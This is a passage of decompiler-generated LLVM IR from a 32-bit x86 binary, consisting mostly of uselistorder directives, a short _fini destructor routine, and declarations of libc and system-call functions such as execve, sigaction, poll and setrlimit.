371, 237, 372, 84, 205, 206, 156, 476, 373, 157, 374, 158, 375, 238, 159, 376, 160, 377, 104, 105, 378, 161, 379, 162, 380, 163, 381, 164, 382, 165, 383, 166, 384, 167, 385, 168, 386, 169, 387, 170, 39, 40, 41, 42, 388, 43, 44, 45, 46, 47, 171, 389, 172, 390, 173, 391, 174, 392, 175, 393, 176, 394, 177, 395, 178, 396, 179, 397, 180, 398, 181, 399, 182, 400, 183, 401, 184, 402, 185, 403, 186, 404, 187, 405, 188, 406, 189, 407, 190, 408, 191, 409, 192, 410, 48, 411, 412, 413, 414, 415, 49, 50, 239, 270, 51, 416, 240, 271, 417, 241, 272, 99, 242, 273, 243, 274, 244, 245, 449, 52, 53, 54, 246, 55, 193, 194, 56, 57, 58, 59, 477, 478, 60, 61, 451, 195, 450, 418, 100, 62, 196, 63, 197, 489, 64, 419, 198, 65, 226, 247, 275, 420, 199, 249, 276, 248, 421, 227, 228, 422, 423, 424, 66, 67, 425, 68, 69, 426, 441, 442, 443, 102, 427, 250, 428, 452, 251, 453, 252, 454, 429, 455, 253, 456, 70, 457, 255, 254, 430, 256, 257, 431, 432, 71, 72, 73, 258, 259, 260, 74, 433, 75, 434, 435, 101, 436, 76, 77, 78, 437, 438, 439, 440, 261, 262, 263 }
  uselistorder i32* @global_var_805e1cc.370, { 1, 0 }
  uselistorder i32 1, { 747, 1530, 407, 1350, 1531, 399, 1532, 255, 1533, 491, 1534, 1535, 30, 1422, 1360, 1346, 750, 749, 748, 1381, 752, 751, 320, 754, 753, 1423, 490, 1536, 755, 127, 126, 125, 124, 387, 492, 493, 1537, 409, 1540, 679, 1541, 1542, 1543, 408, 1544, 427, 724, 105, 104, 1545, 1546, 757, 756, 323, 1547, 758, 1548, 759, 324, 1549, 1550, 760, 325, 326, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 764, 763, 762, 725, 761, 726, 17, 16, 15, 18, 1391, 1392, 766, 765, 727, 728, 200, 202, 201, 203, 205, 204, 548, 1551, 1552, 388, 1553, 1554, 494, 1555, 616, 1556, 1557, 767, 166, 549, 1561, 1558, 1559, 1560, 410, 768, 177, 550, 1406, 389, 390, 1407, 1408, 428, 51, 50, 0, 1393, 154, 152, 153, 770, 769, 773, 772, 771, 199, 691, 429, 617, 692, 680, 777, 776, 775, 774, 1686, 1687, 778, 13, 12, 14, 779, 780, 327, 1, 486, 1425, 1459, 1460, 1461, 495, 1462, 1394, 1395, 1396, 430, 1399, 431, 1400, 1401, 1397, 1398, 782, 781, 1562, 1563, 1564, 783, 331, 330, 328, 329, 619, 1565, 621, 784, 551, 785, 158, 496, 497, 271, 272, 273, 498, 786, 143, 552, 432, 788, 787, 135, 789, 146, 790, 209, 622, 1692, 1693, 1698, 792, 791, 793, 60, 794, 623, 553, 1694, 1695, 1696, 1697, 797, 796, 795, 32, 31, 33, 499, 801, 800, 799, 798, 178, 624, 802, 391, 1566, 1567, 401, 1568, 500, 411, 412, 1569, 1570, 400, 1572, 1573, 1574, 1575, 1576, 501, 805, 804, 803, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 398, 433, 1585, 502, 1586, 1587, 1588, 503, 1589, 1590, 504, 1591, 1592, 1593, 1594, 1595, 625, 745, 807, 806, 95, 96, 554, 555, 1596, 1597, 1598, 1599, 413, 556, 190, 557, 171, 1369, 24, 25, 1370, 26, 27, 1371, 28, 29, 1372, 86, 87, 808, 161, 160, 159, 1373, 809, 156, 157, 155, 92, 91, 558, 693, 434, 810, 224, 559, 1409, 1410, 1411, 435, 811, 123, 812, 207, 206, 437, 438, 439, 440, 441, 436, 813, 266, 267, 560, 561, 442, 814, 119, 562, 729, 189, 563, 815, 730, 136, 137, 564, 565, 1402, 1403, 443, 816, 141, 140, 1404, 444, 505, 818, 817, 334, 332, 335, 333, 1405, 445, 506, 820, 819, 338, 336, 339, 337, 566, 567, 446, 821, 128, 568, 569, 447, 822, 129, 448, 340, 2, 823, 570, 571, 1412, 1413, 1414, 572, 825, 824, 193, 197, 196, 195, 194, 827, 826, 341, 1415, 1416, 1417, 830, 829, 828, 208, 1418, 1419, 1420, 1421, 831, 573, 1424, 833, 832, 176, 835, 834, 836, 574, 694, 575, 576, 1426, 838, 837, 167, 169, 168, 839, 256, 841, 840, 843, 842, 844, 846, 845, 848, 847, 850, 849, 852, 851, 577, 854, 853, 855, 449, 3, 856, 101, 100, 102, 103, 1427, 450, 1347, 343, 344, 342, 184, 858, 857, 731, 251, 626, 861, 860, 859, 507, 1374, 1375, 508, 1376, 1377, 1378, 1379, 876, 875, 874, 873, 872, 871, 870, 869, 868, 732, 867, 866, 865, 864, 863, 862, 90, 88, 89, 1691, 877, 878, 883, 882, 881, 880, 879, 61, 578, 579, 1361, 627, 884, 73, 74, 75, 1428, 891, 890, 889, 888, 887, 886, 885, 248, 893, 892, 1463, 1464, 1465, 894, 71, 895, 1688, 896, 69, 70, 580, 1621, 733, 345, 618, 1644, 1645, 1646, 509, 628, 1647, 897, 1648, 510, 1649, 1650, 909, 908, 907, 906, 905, 904, 903, 902, 901, 900, 899, 898, 354, 355, 351, 348, 352, 346, 350, 347, 349, 353, 1651, 1652, 4, 23, 22, 21, 20, 19, 910, 356, 357, 911, 312, 313, 1689, 1690, 912, 276, 275, 277, 1726, 1727, 1728, 120, 913, 1653, 914, 106, 110, 111, 107, 109, 108, 1654, 581, 917, 916, 915, 918, 358, 919, 359, 920, 360, 921, 923, 922, 113, 924, 260, 925, 142, 927, 926, 317, 928, 929, 252, 1729, 1730, 1731, 932, 931, 930, 98, 97, 99, 1755, 582, 934, 933, 936, 935, 361, 583, 695, 1348, 451, 944, 943, 942, 941, 940, 939, 938, 937, 191, 192, 1494, 947, 946, 945, 174, 172, 173, 170, 629, 948, 1518, 1519, 1520, 686, 1521, 949, 79, 81, 78, 80, 584, 585, 696, 483, 697, 698, 484, 699, 950, 951, 82, 83, 1513, 392, 402, 1514, 734, 952, 64, 66, 63, 65, 953, 55, 53, 52, 57, 56, 54, 48, 46, 49, 45, 47, 630, 955, 954, 631, 956, 632, 957, 633, 960, 959, 958, 700, 963, 962, 961, 363, 634, 1740, 1741, 1742, 964, 249, 250, 1735, 1736, 414, 1737, 1738, 1739, 38, 37, 701, 1734, 511, 364, 366, 365, 635, 965, 34, 636, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 512, 1708, 1709, 1710, 1711, 1712, 588, 1713, 1714, 386, 589, 1715, 1716, 1717, 1718, 586, 587, 1719, 1720, 1721, 968, 967, 966, 148, 150, 147, 149, 151, 969, 590, 591, 970, 592, 593, 594, 513, 514, 515, 702, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 1600, 452, 1601, 637, 487, 638, 1605, 453, 987, 986, 985, 984, 983, 163, 164, 988, 989, 1523, 1524, 1525, 415, 595, 1526, 992, 991, 990, 121, 596, 993, 1571, 994, 122, 1538, 1539, 1655, 1656, 746, 995, 283, 1657, 1602, 1603, 1604, 997, 996, 246, 245, 1606, 1607, 999, 998, 229, 228, 227, 1757, 1000, 115, 116, 114, 1001, 1002, 597, 1608, 1609, 1610, 735, 39, 40, 1622, 1623, 1624, 516, 243, 639, 640, 641, 1625, 1003, 642, 643, 1626, 517, 5, 1005, 1004, 367, 644, 1611, 1612, 1006, 35, 36, 645, 1007, 598, 1008, 1658, 1659, 1351, 519, 1660, 1661, 1662, 1663, 1664, 1666, 1667, 1668, 520, 1669, 1670, 703, 518, 1671, 521, 1672, 1673, 1674, 1665, 1012, 1011, 1010, 1009, 237, 239, 238, 234, 236, 235, 240, 1675, 1013, 309, 306, 308, 307, 522, 1014, 1676, 1677, 1016, 1015, 241, 242, 1678, 1679, 456, 455, 599, 1680, 600, 1681, 1682, 454, 1683, 523, 1684, 646, 1685, 1018, 1017, 230, 232, 231, 233, 524, 647, 6, 648, 1019, 1020, 186, 185, 1732, 1022, 1021, 368, 601, 1756, 1023, 369, 649, 1024, 382, 650, 1025, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 488, 1635, 1030, 1029, 1028, 1027, 1026, 139, 138, 651, 525, 652, 722, 653, 620, 681, 1035, 1034, 736, 1033, 1032, 1031, 93, 94, 654, 1039, 1038, 1037, 1036, 1042, 1041, 1040, 1043, 655, 1636, 1637, 656, 657, 1638, 1045, 1044, 1047, 1046, 214, 1049, 1048, 292, 1050, 67, 1052, 1051, 68, 1053, 62, 1054, 72, 1055, 162, 1057, 1056, 300, 1059, 1058, 213, 1060, 288, 1061, 244, 1062, 265, 1063, 179, 1064, 222, 704, 457, 602, 1065, 682, 458, 1429, 1430, 603, 1066, 175, 1068, 1067, 370, 1070, 1069, 270, 1071, 371, 44, 1072, 321, 1074, 1073, 253, 1075, 198, 1076, 223, 1433, 1078, 1077, 274, 1080, 1079, 314, 1081, 216, 1082, 269, 1083, 187, 1084, 188, 1085, 257, 1086, 372, 1087, 254, 1088, 373, 1090, 1089, 316, 1091, 43, 1092, 318, 311, 1093, 1094, 42, 1097, 1096, 1095, 305, 1101, 1100, 1099, 1098, 41, 1431, 1432, 215, 1102, 295, 1743, 422, 615, 1744, 1745, 1746, 683, 322, 1103, 1105, 1104, 263, 264, 261, 262, 1106, 1722, 1723, 7, 8, 9, 1107, 1750, 1108, 1434, 1109, 1733, 1110, 247, 604, 526, 1113, 1112, 1111, 459, 460, 684, 278, 279, 705, 1115, 1114, 210, 211, 706, 1117, 1116, 284, 285, 658, 1118, 374, 1121, 1120, 1119, 1747, 1125, 1124, 1123, 1122, 1126, 1128, 1127, 221, 1129, 1130, 1724, 1725, 1134, 1133, 1132, 1131, 1435, 1437, 1138, 1137, 1136, 1135, 1139, 1140, 461, 462, 280, 1436, 1141, 375, 319, 1143, 1142, 130, 131, 1145, 1144, 225, 226, 1146, 1149, 1148, 1147, 165, 1151, 1150, 133, 132, 1152, 134, 1154, 1153, 117, 118, 1155, 297, 298, 296, 299, 1158, 1157, 1156, 259, 1438, 1160, 1159, 84, 85, 1439, 315, 489, 463, 464, 465, 466, 1161, 605, 659, 1163, 1162, 212, 1166, 1165, 1164, 527, 1446, 1169, 1168, 1167, 10, 707, 528, 613, 1174, 1173, 1172, 1171, 1170, 310, 529, 1176, 1175, 1177, 1179, 1178, 1180, 1181, 1183, 1182, 708, 485, 1449, 1189, 1188, 1187, 1186, 1185, 1184, 77, 1352, 1191, 1190, 1192, 383, 1193, 1194, 1195, 1196, 1198, 1197, 1199, 1200, 384, 1201, 1202, 1203, 1204, 1205, 385, 1206, 1207, 1208, 1210, 1209, 1212, 1211, 1214, 1213, 1216, 1215, 1218, 1217, 1219, 1220, 1221, 1222, 1224, 1223, 606, 607, 1440, 1441, 1442, 1443, 1225, 76, 614, 530, 1226, 287, 286, 1751, 1752, 1753, 709, 1754, 304, 303, 302, 608, 1749, 1228, 1227, 59, 58, 1229, 416, 467, 470, 468, 469, 1231, 1230, 381, 710, 1748, 417, 1232, 1233, 376, 531, 471, 1235, 1234, 1237, 1236, 1238, 660, 1444, 472, 473, 1445, 1242, 1241, 1240, 1239, 532, 474, 475, 533, 1243, 1246, 1245, 1244, 219, 220, 1247, 218, 217, 1248, 1447, 1251, 1250, 1249, 1448, 534, 1254, 1253, 1252, 1451, 535, 1257, 1256, 1255, 1258, 112, 258, 1259, 1450, 1260, 377, 609, 610, 661, 1262, 1261, 1263, 380, 1264, 293, 1452, 673, 672, 1362, 611, 665, 666, 667, 668, 669, 664, 670, 1363, 671, 1364, 1365, 662, 1366, 663, 1367, 1368, 1349, 674, 476, 1455, 1456, 536, 1268, 1267, 1266, 1265, 180, 181, 182, 537, 1453, 1454, 1270, 1269, 362, 1271, 1272, 1380, 539, 538, 1275, 1274, 1273, 183, 1276, 1457, 1458, 426, 1278, 1277, 675, 711, 1279, 1282, 1281, 1280, 1466, 423, 1467, 424, 1468, 1469, 541, 1470, 1471, 1472, 612, 540, 1473, 542, 1474, 1475, 1476, 393, 403, 418, 676, 1290, 1289, 1288, 1287, 1286, 1285, 1284, 1283, 737, 290, 289, 291, 1477, 1478, 1479, 1480, 1481, 1291, 1297, 1296, 1295, 1294, 1293, 1292, 378, 379, 1482, 1483, 1484, 404, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 738, 394, 1495, 419, 405, 406, 1496, 1497, 1498, 1499, 395, 1500, 1501, 1502, 1503, 1504, 712, 1353, 1354, 1505, 1506, 1507, 1508, 1509, 1303, 1302, 1301, 1300, 1299, 1298, 739, 144, 145, 1510, 1304, 1511, 713, 543, 1512, 1305, 714, 1306, 1308, 1307, 1515, 715, 716, 740, 1313, 1312, 1311, 741, 1310, 1309, 301, 1516, 1517, 717, 718, 1355, 1319, 742, 1318, 1317, 743, 1316, 1315, 1314, 294, 1522, 677, 719, 1356, 720, 1323, 1322, 1321, 1320, 1527, 396, 397, 1528, 1529, 477, 1325, 1324, 268, 478, 479, 480, 481, 1613, 1614, 544, 421, 1615, 1616, 1617, 1357, 545, 420, 1618, 1619, 1358, 721, 1330, 1329, 1328, 1327, 1326, 281, 282, 546, 1331, 547, 1620, 1359, 678, 723, 1338, 1337, 1336, 1335, 1334, 1333, 1332, 1639, 1640, 1641, 1340, 1339, 744, 425, 482, 685, 1642, 11, 1643, 1341, 687, 1758, 1759, 688, 1760, 1761, 689, 690, 1762, 1763, 1342, 1344, 1343, 1345 }
  uselistorder label %dec_label_pc_805a2d6, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805a2eb = load i32, i32* @ebx, align 4
  %v1_805a2ec = call i32 @__get_pc_thunk_bx(i32 %v0_805a2eb)
  store i32 %v1_805a2ec, i32* @eax, align 4
  %v0_805a2f7 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_805a2f7

; uselistorder directives
  uselistorder i32* @eax, { 29, 27, 13, 1, 34, 61, 30, 62, 31, 179, 3, 180, 181, 2, 182, 0, 41, 183, 42, 184, 63, 64, 66, 32, 65, 185, 190, 186, 187, 188, 189, 78, 67, 83, 221, 220, 79, 80, 15, 16, 7, 68, 69, 70, 72, 73, 74, 75, 76, 71, 8, 222, 43, 191, 44, 192, 193, 194, 195, 45, 46, 196, 17, 215, 81, 77, 33, 82, 84, 224, 223, 85, 86, 87, 88, 216, 217, 218, 89, 90, 91, 53, 219, 18, 92, 36, 240, 241, 281, 48, 282, 9, 280, 19, 93, 250, 249, 225, 227, 226, 171, 172, 173, 174, 175, 10, 208, 210, 209, 211, 212, 214, 54, 213, 200, 168, 94, 96, 95, 97, 99, 98, 26, 127, 251, 100, 102, 101, 273, 279, 103, 104, 242, 244, 245, 247, 243, 246, 105, 252, 253, 254, 257, 258, 260, 261, 262, 259, 55, 255, 256, 20, 21, 22, 106, 107, 231, 232, 234, 4, 235, 236, 239, 108, 109, 110, 111, 113, 114, 115, 116, 117, 233, 56, 57, 228, 229, 230, 237, 238, 112, 118, 119, 120, 121, 35, 128, 123, 11, 122, 23, 124, 125, 126, 271, 275, 277, 5, 278, 272, 276, 263, 264, 268, 270, 274, 266, 267, 265, 269, 248, 24, 129, 130, 131, 132, 6, 133, 134, 135, 136, 138, 140, 141, 142, 145, 146, 137, 58, 59, 147, 143, 144, 139, 148, 149, 150, 202, 203, 205, 204, 151, 152, 14, 49, 50, 51, 28, 52, 162, 153, 155, 158, 159, 160, 154, 156, 157, 60, 161, 47, 163, 164, 165, 166, 167, 169, 170, 37, 38, 39, 40, 176, 177, 178, 197, 198, 199, 201, 283, 206, 207, 12, 25 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, {}
  uselistorder i32* @ebx, { 216, 287, 288, 301, 302, 289, 71, 72, 73, 74, 75, 290, 291, 292, 293, 294, 299, 300, 217, 218, 219, 220, 221, 295, 8, 296, 297, 298, 222, 223, 643, 645, 648, 649, 650, 651, 652, 646, 644, 647, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 673, 674, 1, 675, 676, 677, 678, 679, 680, 681, 248, 249, 250, 251, 252, 303, 304, 305, 306, 307, 1054, 1055, 1045, 1049, 1050, 1053, 945, 946, 947, 950, 951, 952, 253, 254, 255, 256, 263, 264, 953, 966, 967, 968, 969, 970, 112, 551, 552, 236, 60, 237, 238, 61, 239, 240, 241, 242, 243, 971, 9, 972, 1010, 1011, 1012, 875, 10, 876, 941, 942, 943, 944, 973, 974, 977, 769, 11, 770, 771, 772, 12, 773, 774, 775, 776, 777, 778, 779, 780, 781, 785, 786, 978, 979, 980, 981, 982, 983, 984, 985, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 244, 245, 1013, 1014, 1015, 1016, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 13, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 339, 340, 341, 15, 695, 684, 682, 683, 685, 690, 686, 687, 691, 692, 693, 14, 694, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 16, 708, 709, 710, 711, 712, 713, 714, 715, 716, 719, 720, 721, 722, 723, 724, 725, 113, 114, 954, 957, 958, 959, 960, 961, 257, 258, 259, 17, 260, 261, 262, 324, 955, 956, 246, 247, 1017, 265, 266, 315, 316, 267, 268, 269, 271, 62, 270, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 308, 309, 310, 311, 1083, 1084, 1085, 1086, 1091, 313, 312, 314, 317, 318, 1087, 1088, 1089, 1090, 319, 320, 321, 322, 323, 962, 963, 964, 965, 325, 326, 18, 327, 328, 1018, 1019, 1020, 1021, 1022, 1023, 329, 330, 331, 1024, 1025, 1026, 1027, 1028, 1029, 1033, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 19, 20, 132, 133, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 332, 333, 334, 335, 336, 337, 1092, 1093, 1180, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 787, 788, 789, 790, 21, 791, 22, 792, 793, 877, 878, 986, 987, 23, 988, 989, 990, 24, 991, 25, 992, 993, 994, 995, 26, 996, 997, 998, 999, 1000, 1001, 1002, 1181, 1182, 27, 1183, 1184, 1185, 1186, 571, 572, 573, 574, 879, 880, 1187, 28, 1188, 1189, 1190, 1191, 1192, 1193, 575, 576, 577, 578, 338, 1051, 1052, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 63, 1094, 1150, 1178, 1179, 1201, 1202, 1203, 1378, 1379, 1380, 1383, 64, 29, 56, 1204, 1371, 1376, 1377, 1205, 617, 618, 619, 620, 621, 622, 623, 624, 579, 580, 581, 582, 1232, 633, 634, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 625, 626, 30, 3, 627, 841, 842, 356, 357, 628, 629, 630, 355, 358, 843, 844, 845, 1340, 1341, 359, 360, 361, 362, 1248, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1277, 1261, 1262, 31, 1263, 1264, 1257, 1258, 1259, 1260, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1146, 1147, 1148, 1149, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 65, 1122, 1126, 1127, 1128, 1129, 1130, 1131, 32, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1342, 1343, 1338, 1339, 492, 493, 494, 495, 726, 727, 728, 729, 730, 731, 33, 732, 733, 734, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1394, 1395, 688, 689, 881, 882, 883, 884, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 735, 736, 737, 738, 34, 35, 739, 740, 741, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 742, 743, 744, 745, 746, 747, 748, 749, 750, 810, 36, 811, 812, 813, 814, 583, 0, 584, 585, 586, 587, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 921, 922, 37, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 38, 936, 937, 938, 939, 940, 134, 135, 136, 137, 916, 918, 917, 919, 920, 1206, 39, 1207, 1208, 1209, 1210, 66, 40, 57, 67, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 4, 1231, 1396, 1397, 1398, 1399, 1400, 815, 816, 817, 818, 819, 820, 821, 41, 822, 42, 823, 824, 825, 826, 827, 828, 829, 588, 589, 590, 591, 592, 593, 594, 595, 598, 599, 600, 608, 609, 610, 611, 861, 862, 863, 864, 865, 866, 830, 831, 832, 833, 834, 1278, 1279, 1280, 601, 602, 603, 635, 636, 1344, 1345, 1346, 1347, 465, 755, 756, 1281, 1282, 540, 541, 542, 435, 436, 437, 438, 439, 440, 428, 429, 430, 543, 544, 545, 782, 783, 784, 363, 368, 364, 365, 366, 367, 369, 375, 370, 371, 372, 373, 374, 717, 718, 596, 597, 376, 1368, 1369, 1370, 1283, 1284, 1285, 1254, 1255, 1256, 377, 378, 395, 396, 397, 43, 398, 975, 976, 1348, 1349, 1350, 1391, 1392, 1393, 1030, 1031, 1032, 466, 467, 563, 564, 948, 949, 1381, 1382, 379, 380, 846, 847, 1046, 1047, 1048, 1286, 1233, 1372, 1373, 1374, 1375, 1123, 1124, 1125, 496, 468, 469, 470, 471, 1234, 1235, 1236, 69, 70, 381, 382, 383, 58, 384, 385, 386, 387, 388, 389, 390, 44, 391, 392, 393, 1287, 68, 45, 1288, 6, 5, 59, 2, 1289, 394, 399, 400, 401, 402, 405, 406, 403, 404, 138, 139, 140, 141, 1157, 1158, 1161, 1162, 1351, 1352, 1356, 1357, 1358, 1367, 407, 408, 409, 410, 411, 1218, 1219, 1220, 1223, 1224, 1225, 1228, 1229, 1230, 1290, 47, 1330, 46, 1335, 1336, 1337, 1221, 1222, 1226, 1227, 412, 413, 1295, 1296, 1297, 1298, 48, 1299, 1300, 1301, 1302, 1303, 1307, 1308, 142, 143, 144, 145, 1291, 1292, 49, 1293, 1294, 414, 415, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1177, 416, 417, 420, 421, 422, 423, 146, 147, 148, 149, 1151, 1152, 1153, 1154, 1155, 1156, 1173, 1174, 50, 1175, 1176, 418, 419, 424, 425, 426, 427, 1309, 1310, 1311, 1249, 1250, 1251, 51, 1252, 1253, 1159, 1160, 1275, 1276, 1304, 1305, 1306, 431, 432, 433, 434, 441, 442, 443, 444, 445, 446, 447, 150, 151, 152, 52, 448, 449, 450, 451, 472, 473, 474, 475, 476, 483, 477, 478, 479, 480, 481, 482, 452, 848, 849, 850, 851, 852, 853, 854, 855, 453, 454, 455, 456, 457, 1359, 1360, 1361, 497, 498, 499, 757, 758, 759, 760, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 1312, 1313, 1314, 1315, 1316, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 604, 605, 606, 607, 867, 868, 869, 870, 761, 762, 763, 764, 751, 752, 753, 754, 765, 766, 767, 768, 187, 188, 189, 190, 191, 192, 193, 194, 195, 637, 638, 639, 640, 458, 459, 460, 1331, 1332, 1333, 1334, 1362, 1363, 1364, 1365, 1366, 1353, 1354, 1355, 1317, 1318, 1319, 1327, 1328, 1329, 1320, 1321, 1325, 1326, 1322, 53, 1323, 1324, 461, 1240, 1246, 1247, 1241, 1242, 1243, 1244, 1245, 462, 463, 464, 1237, 1238, 1239, 196, 197, 484, 485, 486, 487, 488, 489, 490, 491, 500, 503, 504, 506, 511, 198, 199, 200, 201, 512, 513, 514, 515, 507, 508, 54, 509, 510, 501, 502, 505, 516, 856, 857, 858, 859, 860, 517, 518, 76, 77, 78, 79, 55, 80, 81, 82, 84, 85, 86, 87, 88, 89, 83, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 519, 520, 536, 537, 538, 539, 521, 531, 532, 522, 523, 524, 7, 525, 526, 527, 528, 529, 530, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 533, 534, 535, 546, 547, 548, 549, 550, 565, 566, 567, 568, 569, 570, 612, 613, 614, 615, 616, 631, 632, 641, 642, 835, 836, 837, 838, 839, 840, 1401, 1402, 1403, 1404, 871, 872, 873, 874 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %rlimit* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
